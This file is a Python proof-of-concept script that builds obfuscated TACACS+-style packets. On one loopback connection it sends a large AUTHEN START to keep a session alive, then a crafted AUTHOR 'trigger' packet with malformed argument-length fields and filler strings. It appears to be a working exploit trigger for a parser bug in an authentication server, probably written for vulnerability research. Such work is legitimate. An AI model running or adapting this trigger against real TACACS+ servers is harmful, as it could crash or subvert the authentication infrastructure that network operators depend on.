#!/usr/bin/env python3
"""Prime with a large AUTHEN START (session kept alive), then send the crafted
AUTHOR trigger on a later seq of the SAME connection/context. Loopback only.
"""
import argparse
import hashlib
import socket
import struct


def pad(sid, key, version, seq, prev=b""):
    return hashlib.md5(sid + key + bytes([version, seq]) + prev).digest()


def obf(body, sid, key, version, seq):
    p = pad(sid, key, version, seq)
    out = bytearray()
    for i in range(0, len(body), 16):
        c = body[i:i + 16]
        out.extend(a ^ b for a, b in zip(c, p))
        p = pad(sid, key, version, seq, p)
    return bytes(out)


def wire_hdr(ptype, seq, sid, body, key, version=0xC0, flags=0):
    e = obf(body, sid, key, version, seq)
    hdr = struct.pack("!BBBBI", version, ptype, seq, flags, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", len(body))
    return hdr + e


def authen_start(sid, key, user, marker, version=0xC0):
    user_b = user.encode()
    data_b = marker.encode()
    fixed = bytes([1, 0, 1, 1, len(user_b), 0, 0, len(data_b)])
    return wire_hdr(1, 1, sid, fixed + user_b + data_b, key, version)


def author(arg0, rest, data, sid, key, seq, version=0xC0):
    fixed = bytes([6, 1, 1, 1, 0, 0, 0, 1 + len(rest)])
    table = bytes([arg0]) + bytes(rest)
    body = fixed + table + data.encode()
    return wire_hdr(2, seq, sid, body, key, version)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4976)
    ap.add_argument("--key", default="demo")
    ap.add_argument("--sid", default="11223344")
    ap.add_argument("--user", default="demo")
    ap.add_argument("--marker", default="cmd=ZZZZ" * 31)
    ap.add_argument("--data", default="cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH")
    ap.add_argument("--arg0", type=int, default=8)
    ap.add_argument("--rest", type=int, default=19)
    ap.add_argument("--rest-byte", type=int, default=8)
    ap.add_argument("--trigger-seq", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=2.0)
    a = ap.parse_args()
    sid = bytes.fromhex(a.sid)
    key = a.key.encode()

    s = socket.create_connection(("127.0.0.1", a.port), timeout=a.timeout)
    s.settimeout(a.timeout)
    p1 = authen_start(sid, key, a.user, a.marker)
    s.sendall(p1)
    try:
        r1 = s.recv(65536)
    except socket.timeout:
        r1 = b""
    print(f"prime sent={len(p1)} reply_len={len(r1)} reply={r1[:32].hex()}")
    p2 = author(a.arg0, [a.rest_byte] * a.rest, a.data, sid, key, a.trigger_seq)
    s.sendall(p2)
    try:
        r2 = s.recv(65536)
    except socket.timeout:
        r2 = b""
    print(f"trigger sent={len(p2)} reply_len={len(r2)} reply={r2[:32].hex()}")
    s.close()


if __name__ == "__main__":
    main()
